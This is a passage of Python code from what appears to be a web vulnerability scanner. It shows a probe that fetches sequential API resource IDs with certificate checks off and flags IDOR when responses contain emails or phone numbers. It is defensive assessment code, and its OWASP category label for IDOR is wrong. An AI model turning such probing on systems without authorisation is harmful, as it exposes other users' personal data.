            owasp_id="A03:2021",
            cwe_id="CWE-94",
            confidence="firm",
          ))
    except Exception:
      pass

    return probe_result(findings=findings_list)


  # ── A04:2021 — IDOR indicators ──────────────────────────────────────

  _IDOR_PATHS = [
    ("/api/users/", "users"),
    ("/api/user/", "user"),
    ("/api/account/", "account"),
    ("/api/order/", "order"),
  ]
  _PII_PATTERNS = [
    _re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),  # email
    _re.compile(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'),                     # phone
  ]

  def _web_test_idor_indicators(self, target, port):
    """
    Detect predictable/sequential resource IDs (IDOR indicators).

    Default severity is INFO.  Escalates to MEDIUM if PII-like patterns
    (emails, phone numbers) are found in the response.

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    for path_prefix, resource in self._IDOR_PATHS:
      if findings_list:
        break
      try:
        url1 = f"{base_url.rstrip('/')}{path_prefix}1"
        url2 = f"{base_url.rstrip('/')}{path_prefix}2"
        resp1 = requests.get(url1, timeout=3, verify=False)
        resp2 = requests.get(url2, timeout=3, verify=False)

        if resp1.status_code != 200 or resp2.status_code != 200:
          continue
        if resp1.text == resp2.text:
          continue  # same content — likely generic page, not individual resources

        combined = resp1.text + resp2.text
        has_pii = any(p.search(combined) for p in self._PII_PATTERNS)

        if has_pii:
          findings_list.append(Finding(
            severity=Severity.MEDIUM,
            title=f"Sequential resource IDs with PII exposure: {path_prefix}",
            description=f"API endpoint {path_prefix}{{id}} returns different data for "
                        "sequential IDs and contains PII patterns (email/phone), "
                        "suggesting broken access control.",
            evidence=f"GET {url1} and {url2} both returned 200 with PII in body.",
            remediation="Use non-sequential identifiers (UUIDs); enforce per-user authorization.",
            owasp_id="A04:2021",
            cwe_id="CWE-639",
            confidence="firm",
          ))
        else:
          findings_list.append(Finding(
            severity=Severity.INFO,
            title=f"Sequential resource IDs detected: {path_prefix}",
            description=f"API endpoint {path_prefix}{{id}} returns distinct data for "
                        "sequential integer IDs. Manual IDOR verification recommended.",
            evidence=f"GET {url1} and {url2} both returned 200 with different bodies.",
            remediation="Consider using non-sequential identifiers (UUIDs).",
            owasp_id="A04:2021",
            cwe_id="CWE-639",
            confidence="tentative",
          ))
      except Exception:
        continue

    return probe_result(findings=findings_list)
